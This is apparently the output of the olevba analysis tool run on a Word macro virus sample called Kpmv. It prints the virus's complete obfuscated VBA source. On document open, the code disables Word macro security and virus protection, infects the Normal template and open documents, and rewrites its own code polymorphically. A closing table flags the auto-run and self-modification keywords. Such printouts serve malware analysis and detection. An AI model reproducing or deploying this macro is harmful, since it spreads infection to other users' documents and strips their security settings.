olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Kpmv-8abda920a2db9e8109c6317fc76955126114a86c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Kpmv-8abda920a2db9e8109c6317fc76955126114a86c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open(): On Error Resume Next
G1 = ac58p0M9F3s + N3L6s + S3
Dim ub11h2(27) As String: ub11h2(0) = "hu63j1": ub11h2(1) = "fe54u2": ub11h2(2) = "yq53h4": ub11h2(3) = "if15k0": ub11h2(4) = "bs78i2": ub11h2(5) = "nw12o8": ub11h2(6) = "if15k0": ub11h2(7) = "pd66i6": System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
R1 = I7L8q + T3R7u + J7E5m + U6E3w + S2V6u + A3
ub11h2(8) = "em56y1": ub11h2(9) = "lr32d7": ub11h2(10) = "xw52o3": ub11h2(11) = "ku85u8": ub11h2(12) = "yi16i3": ub11h2(13) = "hf25b8": ub11h2(14) = "bm94q1": ub11h2(15) = "xg15y2": Options.VirusProtection = False
T6 = L2I2z + S3C2y + O7U2u + Q5N4y + V7D6n + S6I5n + K9G3i + Q7M1h + Q4J9u + C1E7w + I5
ub11h2(16) = "nm62a5": ub11h2(17) = "yo32z1": ub11h2(18) = "vh65c2": ub11h2(19) = "lp78m6": ub11h2(20) = "jx83r6": ub11h2(21) = "ws98f1": ub11h2(22) = "ub11h2": ub11h2(23) = "mv43s5": Options.SaveNormalPrompt = False
Q6 = H5F8t + M8C7o + M7
ub11h2(24) = "hy84p7": ub11h2(25) = "jh61v6": ub11h2(26) = "ne25j4": ub11h2(27) = "ac58p0": Options.ConfirmConversions = False
U2 = I1R3f + V8G2r + P3H4f + O3K6h + D6R8g + U4T3n + C8B8p + O6R0s + V8D9q + E0A2g + N2E8m + N2
Set hu63j1 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
K7 = I6E2k + L3M6i + P9B1p + M7V2j + T1O8n + J1R3q + S4F7g + K3T1l + O5N5o + I6I4m + A6S8h + D4
Set fe54u2 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
R2 = Q2D8l + I8H0r + Q3D2n + V6
Set yq53h4 = ThisDocument.VBProject.VBComponents.Item(1).CodeModule
M4 = U5B7s + V5A7g + M6R0i + I7H7o + I9K5v + N9B1f + P2A6v + H4F5q + D5K1w + O2
bs78i2 = "private sub" & " document_open()": nw12o8 = "end" & " sub"
G3 = D7Q2i + G7M9f + Q4E6i + A2
if15k0 = yq53h4.Lines(1, yq53h4.CountOfLines)
F5 = I7G5f + B5N2z + T7C5p + O6M6h + D1V4v + O1V2j + H2M2t + G1N9g + G5D1m + H3P7x + D6L8t + E1
pd66i6 = InStr(LCase(if15k0), bs78i2)
F3 = Q2U5w + N1D4w + B2
em56y1 = InStr(pd66i6, LCase(if15k0), nw12o8) + Len(nw12o8)
L1 = L2H0q + F4B5t + T5V6i + I6V1x + C8A7f + H2T6w + H6
lr32d7 = Mid(if15k0, pd66i6, em56y1 - pd66i6)
J1 = C5M2o + Q3B1e + J6C3n + D3C2g + U0M7o + P7O2w + T3S8x + M9
If hu63j1.CountOfLines <> 0 Then
A3 = Q2U8y + V4R1o + I5V8u + P5I1n + D0V1s + G6H5q + E9O6p + H1Q2s + O4J8w + U1I8p + H4S3g + K6
xw52o3 = hu63j1.Lines(1, hu63j1.CountOfLines)
P8 = J9I4w + T6V0l + R0N7p + F1U4j + F2Q5k + D2C9z + L6U1w + M5Q5s + S7
If InStr(xw52o3, "(27) As String") = 0 Then
B5 = Q9R6p + H1M9q + D1C6x + D3F4i + I3S0n + K5R6h + S4T2p + U8F0i + H8J1j + U1L1r + B1H8o + Q4
If InStr(LCase(xw52o3), bs78i2) <> 0 Then
K7 = I1J7o + J4O1o + I5D1w + E8O3m + V7C5e + K2L2s + V1L1f + O3C1q + N2D7z + N6P8j + O4F6u + B6
ku85u8 = False
E6 = M6Q8u + B2K3s + U2P3t + M4N1n + S3T8n + M5N4q + L5
For yi16i3 = 1 To hu63j1.CountOfLines: DoEvents
K7 = P7L9u + D5I3p + I8F2k + S2T5k + E2U7x + B4N8x + Q7O2k + K4O1z + V7U3y + A8E0t + U9E3l + U4
If ku85u8 = False Then
I7 = B3J6v + A1E6y + P6L6r + A6U9k + F6H6g + N7T4n + L1E5l + C6
If LCase(hu63j1.Lines(yi16i3, 1)) = bs78i2 Then
T6 = V5V6t + F2U6m + O5I1y + H4A5h + K6Q8k + E7L7i + C1D6m + G7G8t + M3G3h + K3O7w + S7J9t + G4
ku85u8 = True
D4 = A0I5x + R6D2y + O2C7n + E7K1k + K4R3f + J0E5x + R6H4e + J0
hf25b8 = yi16i3
L9 = F9R8f + I5R6t + F2B8o + C8P3y + C2D9p + P1V5l + Q5E8l + J3L5k + E2
End If
C9 = G8O3x + R3B1p + B8T5p + V4O8m + U2P6v + U7F7g + V5R4r + R8N5n + T7G7r + S8
Else
I5 = V8B7g + T5D8k + D4J6k + T6D2n + L7B3y + G3E1e + Q1C4v + V4V3q + D3J3h + Q6O8i + D7
If LCase(hu63j1.Lines(yi16i3, 1)) = nw12o8 Then
L5 = B8E0h + B9H2j + M2O4i + H0Q8p + U5
bm94q1 = yi16i3
R2 = B3N5u + O8D8f + N6T7i + G2F7y + H7K7h + B7
Exit For
R2 = E3M5t + C5T6s + V3S7m + G6L5q + S7N8s + F0C3j + T9Q6o + B2K1q + F9
End If
I1 = O6T7s + T3A1z + D7A4n + B8I8g + D8V7q + E7S2l + H1T3u + T3
End If
P3 = F6S8t + R3E3q + B9L4l + A5U6h + I2A5k + Q9C1s + M1H6y + V1L7z + M3N7l + I5
Next
F8 = O7S1v + F6O6r + G0U1r + A7F6q + C4U3p + M9D2t + C4N8l + N3N7v + M8H1t + K7I7g + R5
hu63j1.DeleteLines hf25b8, bm94q1 - (hf25b8 - 1)
J3 = M0L5x + H4H6t + A8
End If
K4 = P4M0m + L3R9m + E6P7h + V5
Set xg15y2 = hu63j1
T3 = K1S3t + S8N2v + N4Q9x + B2O3s + G5L2n + K4V2e + B7E6e + P5P5r + I0Q8e + I0T1g + E2
hu63j1.addfromstring lr32d7: If ActiveDocument.Saved = False Then ActiveDocument.Save
N7 = O1G6m + S5K3o + I4D4r + P5L3p + U6J6f + H8N3l + O8A6z + C3N5j + F0U1h + J6J4o + G4I6j + B3
End If
K8 = D8D6p + M1O1f + E1G5k + I2A8n + C3Q7l + Q3F3g + E4M8w + M3
Else
J8 = C5Q4q + K0L6n + K8I1i + O2J2r + P2J2f + G4E4h + C4Q1n + C6T9u + H6K4e + J1
Set xg15y2 = hu63j1
A4 = B1O9p + T2T5v + G1B5w + T4D5h + U3
hu63j1.addfromstring lr32d7: If ActiveDocument.Saved = False Then ActiveDocument.Save
N6 = V8I8s + M7E5o + N1K8o + H8R5n + D1G8z + T1P0q + J5C7i + U4D5s + N5Q5g + M4R3p + M9H3v + T1
End If
O1 = I1P1g + L9I4l + A5C8j + S4H7j + L7F5e + R5L3z + L8E8g + D8D0s + C4
If fe54u2.CountOfLines <> 0 Then
V2 = I3E1p + N6B0k + R4L0x + I8Q5x + A6F4n + P1G6x + J7F5p + E4Q1y + S5
nm62a5 = fe54u2.Lines(1, fe54u2.CountOfLines)
B6 = N8P5o + D6I6r + K8Q5p + P0O7f + C2R5l + K1E7e + U5R7j + A3D3h + U5K3f + M8
If InStr(nm62a5, "(27) As String") = 0 Then
T7 = I0F5m + O6E5g + B0P0s + Q9G4x + D5F1n + N2R6x + L6J5g + V6Q1w + A7M2x + U6
If InStr(LCase(nm62a5), bs78i2) <> 0 Then
T9 = G3Q7n + G2M3i + J5O4r + K5N4f + B6I6h + T7V3n + B1
ku85u8 = False
C4 = C9O6e + E1N3u + M9P8g + O4B7v + F7
For yi16i3 = 1 To fe54u2.CountOfLines: DoEvents
C6 = O7I7i + R7D5f + R1N1s + F4
If ku85u8 = False Then
G2 = D0K7f + C2V7n + U4K0z + P3U2q + F7H8i + Q7H7s + I8U7g + H7V4p + H3L5v + I0B3l + E4U3h + M5
If LCase(fe54u2.Lines(yi16i3, 1)) = bs78i2 Then
C5 = R8G1j + O7L0j + G0J7e + M8P5z + G1J1g + U2H2s + J3H6l + T2E0f + C8
ku85u8 = True
L4 = M7Q2x + U7R4o + R9J5o + K8
hf25b8 = yi16i3
P5 = E0K7p + P3Q9o + Q5A6j + B0
End If
Q6 = E3Q1f + R9G4m + A3
Else
V7 = J2H3i + Q2Q6w + V3D3s + H4P1e + F6A2y + C4U3s + P1R3j + Q4
If LCase(fe54u2.Lines(yi16i3, 1)) = nw12o8 Then
E2 = I1F8p + B1S2u + N6
bm94q1 = yi16i3
H8 = U3H5u + S6V3z + A4C5j + C0
Exit For
L2 = E8K4n + M4G6k + N2C1f + Q6E2o + V8
End If
V5 = I7U4e + U4H7x + E1N9r + E6B2o + L2D1r + T1F6z + N5
End If
K1 = D1O3j + V8U6e + T4L1o + S7V6f + J7R2y + A6
Next
A4 = D8H2w + F5A8v + K0
fe54u2.DeleteLines hf25b8, bm94q1 - (hf25b8 - 1)
N3 = M8T7f + R4P3g + P9K6z + O8L3m + O3B4s + P1N1h + L5K2z + C4
End If
F8 = S5O5t + P4T5t + N1V5x + T9F3w + N2V8z + V8Q6f + Q4T5h + E3Q7y + J6N7t + N4C7k + G2
Set xg15y2 = fe54u2
B7 = S6S1x + M1S4k + L1A5m + A4G7l + R2J2t + A6N8u + L4G9y + C1S2j + M2
fe54u2.addfromstring lr32d7: If NormalTemplate.Saved = False Then NormalTemplate.Save
T0 = Q3T2f + S9C2k + G4P1p + O5F9x + M7M0v + J5K2p + Q7D8t + L6R3p + F7
End If
B1 = M8T1l + Q1N5n + K2I4l + H5A2q + M3D4w + S7D8k + Q7L3e + S8D2n + S7V6i + V1B7r + A7
Else
U6 = U6V3q + K3H6o + Q8O8i + P5B1e + B1E0h + I9F5q + F1K1v + O0O2w + F3Q2i + I3M9f + H6V5s + R1
Set xg15y2 = fe54u2
F8 = V0B5o + P7I1n + Q4B7m + F8H5r + R3Q3j + G3Q2s + L5
fe54u2.addfromstring lr32d7: If NormalTemplate.Saved = False Then NormalTemplate.Save
E3 = D7M2z + U8U9w + F9O0u + A4K1q + C2D3u + I4P4j + U4
End If
I5 = T6S1e + C4C9e + C1V7q + L7Q5s + G3T4u + P2R6p + U5O6k + C3C6x + Q7H1y + S0
If xg15y2 <> "" Then
N6 = B9T2x + B0A4z + L3H6y + H1J1j + L5N7l + A3H8o + I5P7m + M1
Dim yo32z1 As Long, vh65c2 As Long, lp78m6 As Long, jx83r6 As Long
R3 = A8Q7i + H7D1x + Q0
For ws98f1 = 0 To UBound(ub11h2): DoEvents
T4 = U9C5e + C6N8m + V3L1g + F6E7k + S7H1m + E1R5z + T0J9i + B2D3k + R3U2i + I3I7z + P3
Randomize: mv43s5 = Chr(97 + (Rnd * 25)) & Chr(97 + (Rnd * 25)) & Chr(48 + (Rnd * 9)) & Chr(48 + (Rnd * 9)) & Chr(97 + (Rnd * 25)) & Chr(48 + (Rnd * 9)): DoEvents
G2 = D8P7h + R5T8n + D9O0k + D8L5f + N6
yo32z1 = 1: vh65c2 = 1
M2 = I2M6y + V3H8e + R4T5k + R6A4r + A6N8x + C8M5r + P1R4m + A9
With xg15y2
G1 = V1E0t + M4G0f + P4C7y + O7L3p + F7H9l + N3
Do While .Find(ub11h2(ws98f1), yo32z1, vh65c2, lp78m6, jx83r6, True)
G6 = A8U9k + S1J2w + M0T4n + C4G1f + N4G0p + G5T0z + E4U6m + F9K7s + A5
hy84p7 = .Lines(lp78m6, 1)
F6 = B1S5e + D9L8i + P5F3g + L4K2g + E7I9x + J5O7w + E7I3z + S8G4p + H0G8i + A2H5m + E4
jh61v6 = Mid(hy84p7, 1, vh65c2 - 1) & mv43s5 & Mid(hy84p7, jx83r6)
U7 = J4O4u + B8T9v + O6I8l + I1J1u + C6J0m + S4T5v + O2V9g + S6D5i + H4S6l + P6E6j + C8
.replaceline lp78m6, jh61v6: DoEvents
D3 = H9G5f + O8P8t + C3G8z + F1O3x + V4
yo32z1 = lp78m6
F7 = G4B8z + M7Q5g + T4P6w + D1
lp78m6 = .CountOfLines: vh65c2 = 1
K9 = U7R4r + I3P1h + S0G7r + P4U5w + E4F1q + E5B2r + C6J6k + K1E8h + B3
Loop
M8 = T6G7u + V7G7j + B0
End With
F3 = I8N6r + H1Q5y + N1H1h + P3G6x + A2H2j + D6Q1y + M6U2z + C8A1l + G8R8i + F5
Next
I6 = M8T7i + N2D1i + M3N1q + D4
With xg15y2
C9 = D5M5u + P9V3m + E8V1v + T1M1j + R9N8s + S4E9z + T2Q6o + O5M7k + Q4F9o + G1V4m + E3
For ne25j4 = 2 To (.CountOfLines - 1) Step 2: DoEvents
A9 = Q2C1h + A1I8h + Q3B4k + J4A5v + U5V0o + H3T3j + M6Q2e + I5
For ac58p0 = 1 To (Int(Rnd * 10) + 2): DoEvents
F4 = I9J7r + F2C9r + V5C2e + P2C1t + D5J3s + E6P1m + D7P4f + O5I5i + G1U7p + F8O6s + U4A7l + I0
Randomize: mv43s5 = mv43s5 + (Chr(65 + Int(Rnd * 22))) & Chr(48 + (Rnd * 9)) & (Chr(65 + Int(Rnd * 22))) & Chr(48 + (Rnd * 9)) & (Chr(122 - Int(Rnd * 22))) & " + ": DoEvents
L5 = J4S6w + R5H4h + P8O5f + N5N7v + D3J7n + K0I7g + S3T2s + L2L5x + P4F9e + J5A8y + G8O6g + R9
Next ac58p0
J6 = R1R4x + P1D7q + B5U0n + B4R4i + E7S6r + A4O3s + T9N8h + V2
Randomize: .replaceline ne25j4, (Chr(65 + Int(Rnd * 22))) & Chr(48 + (Rnd * 9)) & " = " & mv43s5 & (Chr(65 + Int(Rnd * 22))) & Chr(48 + (Rnd * 9)): DoEvents
N1 = O2G3u + O7P5r + V4R5u + H2T1g + K7F8v + N3G6n + J0M9i + H6D4r + G0N0j + T8J6f + U3P9f + A6
mv43s5 = "": DoEvents
D6 = P7P2z + K6C4q + A1L1i + F6I6j + E2C9g + C1D6p + D5Q7v + D3G5l + V6C5h + B5Q7l + H7H9w + M8
Next ne25j4
K1 = B3O9e + H2U7z + B4N2h + I1
End With
F3 = F6L8l + O4J2f + T7G1x + B6Q1o + P1V6o + G8K4e + A3L7o + A3O9p + K6V2p + B5
End If
L9 = K8F2x + V6U3f + N2K5m + E5
'KPMV Word 2000 Macro Virus - By [K] - Virii Argentina - http://www.virii.com.ar
R1 = F5M5i + G1R5n + Q5I5t + C6T3e + A8E4y + T6D5s + E0R2w + U5
'February 2001 - Buenos Aires - Argentina
A5 = D4J0p + S3B4u + R7
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |http://www.virii.com|URL                                          |
|          |.ar                 |                                             |
+----------+--------------------+---------------------------------------------+

